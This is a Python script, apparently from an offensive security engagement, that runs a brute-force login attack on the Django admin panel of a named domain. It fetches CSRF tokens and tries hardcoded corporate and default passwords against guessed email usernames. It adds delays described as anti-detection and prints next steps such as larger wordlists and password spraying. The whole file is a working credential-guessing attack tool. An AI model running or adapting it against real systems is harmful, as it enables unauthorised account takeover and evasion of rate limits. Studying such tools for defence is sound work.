#!/usr/bin/env python3
"""
Django Admin Bruteforce with CSRF Handling
Target: https://bkd.redahub.cloud/admin/login/
Author: Neural-OffSec-Team
Date: 2025-11-11
Engagement: REDAHUB-web-wildcard
"""

import requests
import re
import time
from typing import Optional, Tuple

# Configura√ß√µes
TARGET_URL = "https://bkd.redahub.cloud/admin/login/"
VERIFY_SSL = False  # Ignorar warnings SSL
DELAY_BETWEEN_ATTEMPTS = 2  # Segundos (evitar rate limiting)
MAX_ATTEMPTS = 50  # Limite de seguran√ßa

# Listas de teste
USERNAMES = [
    "admin@redahub.cloud",
    "suporte@redahub.cloud",
    "contato@redahub.cloud",
    "tech@redahub.cloud",
    "dev@redahub.cloud",
    "root@redahub.cloud",
    "administrator@redahub.cloud",
]

PASSWORDS = [
    # Padr√µes corporativos brasileiros
    "Redahub@2024",
    "Redahub@2025",
    "Redahub123",
    "Redahub@123",
    "Admin@2024",
    "Admin@2025",
    "Admin123",
    "Admin@123",
    "Suporte@2024",
    "Suporte@2025",
    "Suporte123",
    # Django defaults
    "admin",
    "password",
    "admin123",
    "django",
    "django123",
    # Comuns brasileiras
    "Brasil@2024",
    "Senha@123",
    "Password@123",
    "123456",
    "Abc123",
]


class DjangoAdminBruteforcer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.attempts = 0
        self.found_credentials = []

    def get_csrf_token(self) -> Optional[str]:
        """Extrai CSRF token da p√°gina de login"""
        try:
            response = self.session.get(self.target_url)
            match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
            if match:
                return match.group(1)
            return None
        except Exception as e:
            print(f"[!] Erro ao obter CSRF token: {e}")
            return None

    def attempt_login(self, username: str, password: str) -> Tuple[bool, str]:
        """Tenta login com credenciais fornecidas"""
        self.attempts += 1

        # Obter CSRF token fresco
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, "CSRF token n√£o encontrado"

        # Dados do POST
        data = {
            "username": username,
            "password": password,
            "csrfmiddlewaretoken": csrf_token,
            "next": "/admin/",
        }

        # Headers
        headers = {
            "Referer": self.target_url,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            response = self.session.post(
                self.target_url,
                data=data,
                headers=headers,
                allow_redirects=False,
            )

            # An√°lise de resposta
            if response.status_code == 302:
                # Redirect = login bem-sucedido
                if "/admin/" in response.headers.get("Location", ""):
                    return True, "LOGIN SUCESSO"

            # Verificar mensagens de erro
            if "senha incorreta" in response.text.lower() or "password" in response.text.lower():
                return False, "Credenciais inv√°lidas"

            if "bloqueado" in response.text.lower() or "locked" in response.text.lower():
                return False, "CONTA BLOQUEADA (rate limiting ativado)"

            if response.status_code == 429:
                return False, "RATE LIMITING DETECTADO (HTTP 429)"

            return False, f"Falha (HTTP {response.status_code})"

        except Exception as e:
            return False, f"Erro: {e}"

    def run(self):
        """Executa bruteforce"""
        print(f"[*] Django Admin Bruteforce Iniciado")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Usernames: {len(USERNAMES)}")
        print(f"[*] Passwords: {len(PASSWORDS)}")
        print(f"[*] Total de combina√ß√µes: {len(USERNAMES) * len(PASSWORDS)}")
        print(f"[*] Delay entre tentativas: {DELAY_BETWEEN_ATTEMPTS}s")
        print(f"[*] Limite m√°ximo: {MAX_ATTEMPTS} tentativas")
        print("-" * 60)

        for username in USERNAMES:
            for password in PASSWORDS:
                if self.attempts >= MAX_ATTEMPTS:
                    print(f"\n[!] Limite de {MAX_ATTEMPTS} tentativas atingido. Abortando.")
                    break

                print(f"[{self.attempts + 1}/{MAX_ATTEMPTS}] Testando: {username}:{password}... ", end="")

                success, message = self.attempt_login(username, password)
                print(message)

                if success:
                    print(f"\nüéØ [SUCESSO] Credenciais v√°lidas encontradas!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    self.found_credentials.append((username, password))

                if "RATE LIMITING" in message or "BLOQUEADO" in message:
                    print(f"\n[!] Rate limiting detectado. Abortando ataque.")
                    print(f"[+] Isto √© uma DEFESA POSITIVA do servidor.")
                    break

                # Delay anti-detection
                time.sleep(DELAY_BETWEEN_ATTEMPTS)

            if self.attempts >= MAX_ATTEMPTS:
                break

        # Relat√≥rio final
        print("\n" + "=" * 60)
        print("[*] RELAT√ìRIO FINAL")
        print("=" * 60)
        print(f"Total de tentativas: {self.attempts}")
        print(f"Credenciais encontradas: {len(self.found_credentials)}")

        if self.found_credentials:
            print("\nüîì CREDENCIAIS V√ÅLIDAS:")
            for username, password in self.found_credentials:
                print(f"  - {username}:{password}")
        else:
            print("\n‚ùå Nenhuma credencial v√°lida encontrada.")
            print("   Recomenda√ß√µes:")
            print("   1. Expandir wordlist (rockyou.txt)")
            print("   2. User enumeration para identificar emails v√°lidos")
            print("   3. Password spraying com senhas espec√≠ficas")


if __name__ == "__main__":
    # Suprimir warnings SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    bruteforcer = DjangoAdminBruteforcer(TARGET_URL)
    bruteforcer.run()
